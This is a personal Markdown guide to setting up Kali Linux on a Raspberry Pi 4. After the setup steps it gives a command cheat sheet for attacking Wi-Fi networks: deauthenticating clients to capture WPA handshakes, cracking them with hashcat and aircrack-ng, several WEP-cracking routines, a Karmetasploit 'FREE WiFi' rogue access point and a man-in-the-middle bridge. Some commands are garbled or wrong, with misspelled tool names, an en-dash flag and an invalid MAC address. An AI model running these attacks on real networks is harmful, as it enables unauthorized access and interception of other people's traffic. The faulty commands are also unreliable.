# Kali Linux setup and config

## Download Kali for Raspberry (my model is PI 4 Model B with 8GB)

Site:   https://www.offensive-security.com/kali-linux-arm-images/  
Location:   https://images.kali.org/arm-images/kali-linux-2021.1-rpi4-nexmon-64.img.xz  
Filename:   kali-linux-2021.1-rpi4-nexmon-64.img.xz  
SHA256Sum:  f5e126f33d32882f526e16b5148bd8b84a4e7c351bdd0eb9cfe3da2176580181  

## Flash SD Micro Card (my model is SanDisk 128GB) using Etcher or dd

The image is xz compressed and about 2GB, which can be expanded and copied to a microSD card with either 

https://www.balena.io/etcher/  

or 
```bash
xzcat kali-linux-2020.4-rpi4-nexmon.img.xz | dd bs=4M of=/dev/sdX iflag=fullblock oflag=direct status=progress
```
Replace /dev/sdX with the actual device name for your SD card device!

_These images uncompress to about 9GB, so you will need at least a 16GB microSD card, and if you are going to do any serious work with it you will almost certainly need an even larger card._  

## First login 

Username:   kali  
Password:   kali

## Finalize setup

### Change keyboard layout
Open Terminal:  

either use:  

```bash
sudo dpkg-reconfigure keyboard-configuration 
```
or directly edit the keyboard config file:  
[Reference can be found here](/xkb-map-file.txt)
```
sudo nano /etc/default/keyboard
```

My recommendation for Swiss German:

```console
XKBMODEL="pc105"  
XKBLAYOUT="ch"  
XKBVARIANT="de_nodeadkeys"  
XKBOPTIONS="terminate:ctrl_alt_bksp"  

BACKSPACE="guess"
```
For the changes to take effect:  

```bash
sudo service keyboard-setup restart  
```
### Change password
Open Terminal: 

For the currently logged in user _kali_ (first line) and also for the user _root_ (second line)
```bash
passwd
sudo passwd root
```

### Update installation
Open Terminal:  
```bash
sudo apt update && sudo apt dist-upgrade -y
```

Configuring console-setup wizard -> Latin2 - central Europe and Romanian  
Configuring wireshark-common -> No 

### Remove the black border (display)

```bash
sudo nano /boot/config.txt
```
uncomment the line #disable_overscan=1

```console
disable_overscan=1
```

reboot in order for the changes to take effect.

### Set timezone
```bash
sudo timedatectl set-timezone Europe/Zurich
```

# Wifi 
To start Network Manager
```
systemctl start NetworkManager 
```

# Ethical hacking section

WPA-2 Hash Cracking  
https://asecuritysite.com/encryption/ssid_hm  

How to hack WiFi networks with mobile Raspberry Pi set?  
https://secabit.medium.com/how-to-hack-wifi-networks-with-mobile-raspberry-pi-set-9feb2b43a49  

Put your network device into monitor mode / Turn off Int / Set interface down  
```bash
sudo ip link set wlan0 down  
```

Set monitor mode
```bash
iwconfig wlan0 mode monitor  
```

Turn up interface
```bash
ip link set wlan0 up
```

Use airmon-ng to put int into monitor mode
```bash
airmon-ng start wlan0
```

Listen for all nearby beacon frames to get target BSSID and 
```bash
airodump-ng wlan0 --band abg  
```
Set 5 GHz channel
```bash
iwconfig wlan0 channel 149
```
Start listening for the handshake
```bash
airodump-ng -c 149 --bssid P4:E4:E4:92:60:71 -w cap01.cap wlan0
```

Deauth a connected client to force a handshake
```bash
aireplay-ng -D -0 2 -a 9C:5C:8E:C9:AB:C0 -c P4:E4:E4:92:60:71 wlan0
```

Convert cap to hccapx
```bash
aircrack-ng -J file.cap capture.hccap  
```

Crack with hashcat:
```bash
hashcat.exe -m 2500 capture.hccapx rockyou.txt  
```
Setting TX POWER
```bash
iw reg set BO  
iwconfig wlan1 txpower 25  
```
Cracking WPA
```bash
airmon-ng start wlan0
airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon
aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {disassociation attack}
aircrack-ng -0 -w (wordlist path) (caputure filename)
``` 

Cracking WEP with Connected Clients
```bash
airmon-ng start wlan0 ( channel)  
airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon  
aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication}  
aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {disassociation attack}  
aireplay-ng -3 -b (AP MAC) -h (OUR MAC) wlan0mon {ARP replay attack}  
```

Cracking WEP via a Client
```bash
airmon-ng start wlan0 (channel)  
airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon  
aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication}  
aireplay-ng -2 -b (AP MAC) -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon  
aireplay-ng -2 -r (replay cap file) wlan0mon {inject using cap file}  
aircrack-ng -0 -z(PTW) -n 64(64bit) filename.cap  
```

ARP amplification
```bash
airmon-ng start wlan0 ( channel)
airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon
aireplay-ng -1 500 -q 8 -a (AP MAC) wlan0mon
areplay-ng -5 -b (AP MAC) -h (OUR MAC) wlan0mon
packetforge-ng -0 -a (AP MAC) -h (OUR MAC) -k 255.255.255.255 -l 255.255.255.255 -y (FRAGMENT.xor) -w (filename.cap)
tcpdump -n -vvv -e -s0 -r (replay_dec.#####.cap)
packetforge-ng -0 -a (AP MAC) -h (OUR MAC) -k (destination IP) -l (source IP) -y (FRAGMENT.xor) -w (filename.cap)
aireplay-ng -2 -r (filename.cap) wlan0mon
```

Cracking WEP /w shared key AUTH
```bash
airmon-ng start wlan0 ( channel)
airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon
```
(this will error out~aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication}

```bash
aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {deauthentication attack}
aireplay-ng -1 60 -e (ESSID) -y (sharedkeyfile) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication /w PRGA xor file}
aireplay-ng -3 -b (AP MAC) -h (OUR MAC) wlan0mon {ARP replay attack}
aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {deauthentication attack}
aircrack-ng -0 -z(PTW) -n 64(64bit) filename.cap
```

Cracking a Clientless WEP (FRAG AND KOREK)
FRAG

```bash
airmon-ng start wlan0 (channel)
airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon
aireplay-ng -1 60 -e (ESSID) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication}
aireplay-ng -5 (frag attack) -b (AP MAC) -h (OUR MAC) wlan0mon
packetforge-ng -0 -a (APMAC) -h (OUR MAC) -l 255.255.255.255 -k 255.255.255.255 -y (fragment filename) -w filename.cap
tcpdump -n -vvv -e -s0 -r filename.cap {TEST}
aireplay-ng -2 -r filename.cap wlan0mon
```

KOREK
```bash
aireplay-ng -4 -b (AP MAC) -h (OUR MAC) wlan0mon
tcpdump -s 0 -s -e -r replayfilename.cap
packetforge-ng -0 -a (APMAC) -h (OUR MAC) -l 255.255.255.255(source IP) -k 255.255.255.255(dest IP) -y (fragmentfilename xor) -w filename.cap
aireplay-ng -2 -r filename.cap wlan0mon
aircrack-ng -0 filename.cap
```

Karmetasploit
```bash
airbase-ng -c (channel) -P -C 60 -e “FREE WiFi” -v wlan0mon
ifconfig at0 up 10.0.0.1/24
mkdir -p /var/run/dhcpd
chown -R dhcpd:dhcpd /var/run/dhcpd
touch /var/lib/dhcp3/dhcpd.leases
cat dhcpd.conf
touch /tmp/dhcp.log
chown dhcpd:dhcpd /tmp/dhcp.log
dhcpd3 -f -cf /tmp/dhcpd.conf -pf /var/run/dhcpd/pid -lf /tmp/dhcp.log at0
msfconsole -r /root/karma.rc
```

Bridge CTRL man in the middle SETUP
```bash
airebase-ng -c 3 -e “FREE WiFi” wlan0mon
brctl addbr hacker(interface name)
brctl addif hacker eth0
brctl addif hacker at0
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
ifconfig hacker 192.168.1.8 up
ifconfig hacker
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Pyrit eval

```bash
pyrit -i (wordlist) import_passwords
pyrit -e (essid) create_essid
pyrit batch
pyrit batch -r (capturefile) -b(AP MAC) attack_db
pyrit strip
pyrit -r (capturefile) -o (capturefile output) strip
pyrit dictionary attack
pyrit -r (capturefile) -i (/pathtowordlist) -b (AP MAC) attack_passthrough
```

Airgraph-ng

```bash
airgraph-ng -i filename.csv -g CAPR -o outputfilename.png
eog outputfilename.png
airgraph-ng -i filename.csv -g CPG -o outputfilename.png
eog outputfilename.png
```

Airdecap-ng
```bash
airdecap-ng -b (vic ap) outputfilename.cap  
wireshark outputfilename.cap  
airdecap-ng -w (WEP KEY) (capturefile.cap)  
wireshark capturefile-DEC.cap  
airdecap-ng -e (ESSID VIC) -p (WPA PASSWORD) (capturefile.cap)  
wireshark capturefile-dec.cap  
```` 